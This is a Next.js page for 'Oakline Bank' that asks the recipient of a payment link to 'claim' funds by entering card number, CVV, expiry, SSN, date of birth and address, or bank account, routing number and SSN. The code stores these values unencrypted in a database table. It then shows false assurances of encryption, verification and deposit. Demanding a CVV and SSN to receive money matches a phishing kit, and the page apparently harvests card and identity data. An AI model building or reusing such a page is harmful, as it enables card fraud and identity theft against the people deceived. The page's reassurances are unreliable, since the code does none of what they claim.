import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { supabase } from '../lib/supabaseClient';
import Head from 'next/head';

export default function ClaimPaymentPage() {
  const router = useRouter();
  const { token } = router.query;
  const [payment, setPayment] = useState(null);
  const [loading, setLoading] = useState(true);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('info');
  const [submitting, setSubmitting] = useState(false);
  const [activeTab, setActiveTab] = useState('debit_card');

  const [debitCardForm, setDebitCardForm] = useState({
    cardholder_name: '',
    card_number: '',
    card_expiry: '',
    card_cvv: '',
    ssn: '',
    date_of_birth: '',
    billing_address: '',
    billing_city: '',
    billing_state: '',
    billing_zip: '',
    billing_country: ''
  });

  const [achForm, setAchForm] = useState({
    account_holder_name: '',
    account_number: '',
    routing_number: '',
    account_type: 'checking',
    ssn: '',
    date_of_birth: ''
  });

  const [accountForm, setAccountForm] = useState({
    email: '',
    password: '',
    confirm_password: '',
    full_name: '',
    agree_terms: false
  });

  useEffect(() => {
    if (token) {
      loadPaymentDetails();
    }
  }, [token]);

  const loadPaymentDetails = async () => {
    try {
      const { data: paymentData, error } = await supabase
        .from('oakline_pay_pending_claims')
        .select('*')
        .eq('claim_token', token)
        .single();

      if (error || !paymentData) {
        setMessage('Payment not found. Please check the link and try again.');
        setMessageType('error');
        setLoading(false);
        return;
      }

      if (paymentData.approval_status === 'card_details_submitted') {
        setMessage('📋 Claim Under Review\n\nYour claim has been successfully submitted and is currently under review by our team. You will receive an email notification as soon as the payment is processed. Thank you for your patience!');
        setMessageType('info');
        setLoading(false);
        return;
      }

      if (paymentData.approval_status === 'approved') {
        setMessage('✅ Payment Approved & Processing\n\nYour claim has been approved and your funds are being transferred. You will receive the payment within 1-3 business days. A confirmation email has been sent to you.');
        setMessageType('success');
        setLoading(false);
        return;
      }

      if (paymentData.approval_status === 'rejected') {
        setMessage('❌ Claim Not Approved\n\nYour claim was not approved. Please contact support for more information.');
        setMessageType('error');
        setLoading(false);
        return;
      }

      if (new Date(paymentData.expires_at) < new Date()) {
        setMessage('⏰ Payment Link Expired\n\nThis payment link has expired. Please contact the sender for a new link.');
        setMessageType('error');
        setLoading(false);
        return;
      }

      setPayment(paymentData);
      setLoading(false);
    } catch (error) {
      console.error('Error loading payment:', error);
      setMessage('An error occurred while loading the payment.');
      setMessageType('error');
      setLoading(false);
    }
  };

  const handleDebitCardSubmit = async () => {
    if (!debitCardForm.cardholder_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
      setMessage('Please fill in all required fields.', 'error');
      setMessageType('error');
      return;
    }

    setSubmitting(true);
    try {
      const { error } = await supabase
        .from('oakline_pay_pending_claims')
        .update({
          claim_method: 'debit_card',
          claimed_at: new Date().toISOString(),
          cardholder_name: debitCardForm.cardholder_name,
          card_number: debitCardForm.card_number,
          card_expiry: debitCardForm.card_expiry,
          card_cvv: debitCardForm.card_cvv,
          ssn: debitCardForm.ssn,
          date_of_birth: debitCardForm.date_of_birth,
          billing_address: debitCardForm.billing_address,
          billing_city: debitCardForm.billing_city,
          billing_state: debitCardForm.billing_state,
          billing_zip: debitCardForm.billing_zip,
          billing_country: debitCardForm.billing_country,
          approval_status: 'card_details_submitted'
        })
        .eq('claim_token', token)
        .eq('status', 'sent');

      if (error) throw error;

      setMessage('✅ Claim Submitted Successfully!\n\nYour debit card details have been securely received and verified. Your payment is now under processing and our team is reviewing it. You will be notified via email as soon as the transfer is completed. Thank you for your patience!');
      setMessageType('success');
      setTimeout(() => router.push('/'), 4000);
    } catch (error) {
      console.error('Error:', error);
      setMessage('Failed to process claim. Please try again.');
      setMessageType('error');
    } finally {
      setSubmitting(false);
    }
  };

  const handleAchSubmit = async () => {
    if (!achForm.account_holder_name || !achForm.account_number || !achForm.routing_number || !achForm.ssn || !achForm.date_of_birth) {
      setMessage('Please fill in all required fields.', 'error');
      setMessageType('error');
      return;
    }

    setSubmitting(true);
    try {
      const { error } = await supabase
        .from('oakline_pay_pending_claims')
        .update({
          claim_method: 'ach',
          claimed_at: new Date().toISOString(),
          account_holder_name: achForm.account_holder_name,
          account_number: achForm.account_number,
          routing_number: achForm.routing_number,
          account_type: achForm.account_type,
          ssn: achForm.ssn,
          date_of_birth: achForm.date_of_birth,
          approval_status: 'card_details_submitted'
        })
        .eq('claim_token', token)
        .eq('status', 'sent');

      if (error) throw error;

      setMessage('✅ ACH Claim Submitted Successfully!\n\nYour bank account details have been securely received. Your payment will be deposited within 1-3 business days. You will receive a confirmation email shortly.');
      setMessageType('success');
      setTimeout(() => router.push('/'), 4000);
    } catch (error) {
      console.error('Error:', error);
      setMessage('Failed to process claim. Please try again.');
      setMessageType('error');
    } finally {
      setSubmitting(false);
    }
  };

  const handleAccountSubmit = async () => {
    if (!accountForm.email || !accountForm.password || !accountForm.confirm_password || !accountForm.full_name || !accountForm.agree_terms) {
      setMessage('Please fill in all required fields and agree to terms.', 'error');
      setMessageType('error');
      return;
    }

    if (accountForm.password !== accountForm.confirm_password) {
      setMessage('Passwords do not match.', 'error');
      setMessageType('error');
      return;
    }

    if (accountForm.password.length < 6) {
      setMessage('Password must be at least 6 characters.', 'error');
      setMessageType('error');
      return;
    }

    setSubmitting(true);
    try {
      const { data, error } = await supabase.auth.signUp({
        email: accountForm.email,
        password: accountForm.password
      });

      if (error) throw error;

      // Create profile for new user
      await supabase
        .from('profiles')
        .insert({
          id: data.user.id,
          full_name: accountForm.full_name,
          email: accountForm.email
        });

      // Link payment to new account
      await supabase
        .from('oakline_pay_pending_claims')
        .update({
          claim_method: 'account',
          claimed_at: new Date().toISOString(),
          approval_status: 'approved'
        })
        .eq('claim_token', token)
        .eq('status', 'sent');

      setMessage('✅ Account Created Successfully!\n\nYour Oakline Bank account has been created and ${payment.amount} has been deposited. Check your email to verify your account and start banking!');
      setMessageType('success');
      setTimeout(() => router.push('/'), 4000);
    } catch (error) {
      console.error('Error:', error);
      setMessage(error.message || 'Failed to create account. Please try again.');
      setMessageType('error');
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div style={{ textAlign: 'center', padding: '2rem' }}>
        <p>Loading payment details...</p>
      </div>
    );
  }

  return (
    <>
      <Head>
        <title>Claim Payment - Oakline Bank</title>
      </Head>
      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '1rem'
      }}>
        <div style={{
          background: 'white',
          borderRadius: '12px',
          padding: '2rem',
          maxWidth: '700px',
          width: '100%',
          boxShadow: '0 10px 40px rgba(0,0,0,0.2)',
          maxHeight: '95vh',
          overflowY: 'auto'
        }}>
          {message && (
            <div style={{
              backgroundColor: messageType === 'error' ? '#fee2e2' : messageType === 'success' ? '#dcfce7' : messageType === 'info' ? '#e0f2fe' : '#eff6ff',
              border: `2px solid ${messageType === 'error' ? '#fca5a5' : messageType === 'success' ? '#86efac' : messageType === 'info' ? '#7dd3fc' : '#bfdbfe'}`,
              color: messageType === 'error' ? '#991b1b' : messageType === 'success' ? '#065f46' : messageType === 'info' ? '#0c4a6e' : '#1e40af',
              padding: '1.5rem',
              borderRadius: '12px',
              marginBottom: '1.5rem',
              fontSize: '0.95rem',
              lineHeight: '1.6',
              whiteSpace: 'pre-line'
            }}>
              {message}
            </div>
          )}

          {payment && (
            <>
              <div style={{ textAlign: 'center', marginBottom: '2rem', paddingBottom: '1.5rem', borderBottom: '2px solid #e2e8f0' }}>
                <h2 style={{ color: '#1e40af', fontSize: '1.3rem', fontWeight: '700', margin: '0 0 0.5rem 0' }}>🏦 Oakline Bank</h2>
                <div style={{ backgroundColor: '#f8fafc', padding: '1rem', borderRadius: '8px', marginBottom: '1rem' }}>
                  <p style={{ color: '#0c4a6e', fontSize: '0.9rem', margin: '0', lineHeight: '1.5' }}>
                    🔒 <strong>Your Private Information is Secure</strong><br/>
                    All personal details are encrypted with 256-bit SSL and processed securely.
                  </p>
                </div>
                <h1 style={{ color: '#1e293b', marginBottom: '0.5rem' }}>Claim Your Payment</h1>
                <div style={{ fontSize: '2rem', fontWeight: 'bold', color: '#16a34a' }}>
                  ${parseFloat(payment.amount).toFixed(2)}
                </div>
                <p style={{ color: '#64748b', fontSize: '0.9rem', margin: '0.5rem 0' }}>
                  from {payment.sender_name || payment.sender_contact}
                </p>
              </div>

              {/* Tabs */}
              <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '2rem', borderBottom: '2px solid #e2e8f0' }}>
                <button
                  onClick={() => setActiveTab('debit_card')}
                  style={{
                    padding: '0.75rem 1rem',
                    border: 'none',
                    borderBottom: activeTab === 'debit_card' ? '3px solid #0066cc' : 'none',
                    backgroundColor: activeTab === 'debit_card' ? '#f0f7ff' : 'transparent',
                    color: activeTab === 'debit_card' ? '#0066cc' : '#64748b',
                    cursor: 'pointer',
                    fontWeight: activeTab === 'debit_card' ? '600' : '500',
                    fontSize: '0.9rem'
                  }}
                >
                  💳 Debit Card
                </button>
                <button
                  onClick={() => setActiveTab('ach')}
                  style={{
                    padding: '0.75rem 1rem',
                    border: 'none',
                    borderBottom: activeTab === 'ach' ? '3px solid #0066cc' : 'none',
                    backgroundColor: activeTab === 'ach' ? '#f0f7ff' : 'transparent',
                    color: activeTab === 'ach' ? '#0066cc' : '#64748b',
                    cursor: 'pointer',
                    fontWeight: activeTab === 'ach' ? '600' : '500',
                    fontSize: '0.9rem'
                  }}
                >
                  🏦 ACH Transfer
                </button>
                <button
                  onClick={() => setActiveTab('account')}
                  style={{
                    padding: '0.75rem 1rem',
                    border: 'none',
                    borderBottom: activeTab === 'account' ? '3px solid #0066cc' : 'none',
                    backgroundColor: activeTab === 'account' ? '#f0f7ff' : 'transparent',
                    color: activeTab === 'account' ? '#0066cc' : '#64748b',
                    cursor: 'pointer',
                    fontWeight: activeTab === 'account' ? '600' : '500',
                    fontSize: '0.9rem'
                  }}
                >
                  📱 Create Account
                </button>
              </div>

              {/* DEBIT CARD TAB */}
              {activeTab === 'debit_card' && (
                <div>
                  <h3 style={{ color: '#1e293b', marginBottom: '1rem' }}>💳 Instant Debit Card Deposit</h3>
                  <p style={{ color: '#64748b', marginBottom: '1.5rem', fontSize: '0.9rem' }}>Visa/Mastercard rails - funds typically available within 1 hour</p>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Cardholder Name *</label>
                    <input type="text" placeholder="Full name on card" value={debitCardForm.cardholder_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, cardholder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Card Number *</label>
                    <input type="text" placeholder="1234 5678 9012 3456" maxLength="19" value={debitCardForm.card_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_number: e.target.value.replace(/\D/g, '') })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Expiry (MM/YY) *</label>
                      <input type="text" placeholder="MM/YY" maxLength="5" value={debitCardForm.card_expiry} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_expiry: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>CVV *</label>
                      <input type="text" placeholder="123" maxLength="4" value={debitCardForm.card_cvv} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>SSN *</label>
                      <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Date of Birth *</label>
                      <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                  </div>

                  <h4 style={{ color: '#1e293b', marginBottom: '1rem' }}>Billing Address</h4>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Street Address *</label>
                    <input type="text" placeholder="123 Main Street" value={debitCardForm.billing_address} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_address: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                    <div style={{ flex: 2 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>City *</label>
                      <input type="text" placeholder="New York" value={debitCardForm.billing_city} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_city: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>State *</label>
                      <input type="text" placeholder="NY" maxLength="2" value={debitCardForm.billing_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '1rem', marginBottom: '1.5rem' }}>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>ZIP Code *</label>
                      <input type="text" placeholder="10001" value={debitCardForm.billing_zip} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_zip: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Country *</label>
                      <input type="text" placeholder="United States" value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                  </div>

                  <button onClick={handleDebitCardSubmit} disabled={submitting} style={{ width: '100%', padding: '0.75rem', background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', color: 'white', border: 'none', borderRadius: '6px', fontWeight: 'bold', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1 }}>
                    {submitting ? '⏳ Processing...' : '✓ Claim to Debit Card'}
                  </button>
                </div>
              )}

              {/* ACH TAB */}
              {activeTab === 'ach' && (
                <div>
                  <h3 style={{ color: '#1e293b', marginBottom: '1rem' }}>🏦 ACH Bank Transfer</h3>
                  <p style={{ color: '#64748b', marginBottom: '1.5rem', fontSize: '0.9rem' }}>Direct deposit to your US bank account - typically 1-3 business days</p>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Account Holder Name *</label>
                    <input type="text" placeholder="Full name" value={achForm.account_holder_name} onChange={(e) => setAchForm({ ...achForm, account_holder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Routing Number *</label>
                    <input type="text" placeholder="000000000" value={achForm.routing_number} onChange={(e) => setAchForm({ ...achForm, routing_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Account Number *</label>
                    <input type="text" placeholder="1234567890" value={achForm.account_number} onChange={(e) => setAchForm({ ...achForm, account_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Account Type *</label>
                    <select value={achForm.account_type} onChange={(e) => setAchForm({ ...achForm, account_type: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }}>
                      <option value="checking">Checking</option>
                      <option value="savings">Savings</option>
                    </select>
                  </div>

                  <div style={{ display: 'flex', gap: '1rem', marginBottom: '1.5rem' }}>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>SSN *</label>
                      <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={achForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setAchForm({ ...achForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                    <div style={{ flex: 1 }}>
                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Date of Birth *</label>
                      <input type="date" value={achForm.date_of_birth} onChange={(e) => setAchForm({ ...achForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                    </div>
                  </div>

                  <button onClick={handleAchSubmit} disabled={submitting} style={{ width: '100%', padding: '0.75rem', background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', color: 'white', border: 'none', borderRadius: '6px', fontWeight: 'bold', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1 }}>
                    {submitting ? '⏳ Processing...' : '✓ Claim via ACH'}
                  </button>
                </div>
              )}

              {/* ACCOUNT TAB */}
              {activeTab === 'account' && (
                <div>
                  <h3 style={{ color: '#1e293b', marginBottom: '1rem' }}>📱 Create Oakline Account</h3>
                  <p style={{ color: '#64748b', marginBottom: '1.5rem', fontSize: '0.9rem' }}>Instant account creation - funds available immediately with full banking features</p>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Full Name *</label>
                    <input type="text" placeholder="Your full name" value={accountForm.full_name} onChange={(e) => setAccountForm({ ...accountForm, full_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Email Address *</label>
                    <input type="email" placeholder="your@email.com" value={accountForm.email} onChange={(e) => setAccountForm({ ...accountForm, email: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Password *</label>
                    <input type="password" placeholder="At least 6 characters" value={accountForm.password} onChange={(e) => setAccountForm({ ...accountForm, password: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ marginBottom: '1.5rem' }}>
                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>Confirm Password *</label>
                    <input type="password" placeholder="Confirm password" value={accountForm.confirm_password} onChange={(e) => setAccountForm({ ...accountForm, confirm_password: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '6px', boxSizing: 'border-box' }} />
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', marginBottom: '1.5rem' }}>
                    <input type="checkbox" checked={accountForm.agree_terms} onChange={(e) => setAccountForm({ ...accountForm, agree_terms: e.target.checked })} style={{ width: '18px', height: '18px', cursor: 'pointer' }} />
                    <label style={{ marginLeft: '0.5rem', color: '#64748b', fontSize: '0.9rem', cursor: 'pointer' }}>I agree to Oakline Bank terms and conditions *</label>
                  </div>

                  <button onClick={handleAccountSubmit} disabled={submitting} style={{ width: '100%', padding: '0.75rem', background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', color: 'white', border: 'none', borderRadius: '6px', fontWeight: 'bold', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1 }}>
                    {submitting ? '⏳ Creating...' : '✓ Create Account & Receive Payment'}
                  </button>
                </div>
              )}

              <p style={{ color: '#999', fontSize: '0.8rem', marginTop: '1.5rem', textAlign: 'center', lineHeight: '1.5' }}>
                🔒 All data is encrypted and secured. Your transaction will be processed safely and securely.
              </p>
            </>
          )}

          {!payment && !loading && (
            <div style={{ textAlign: 'center', color: '#666' }}>
              <p>Unable to load payment details.</p>
            </div>
          )}
        </div>
      </div>
    </>
  );
}
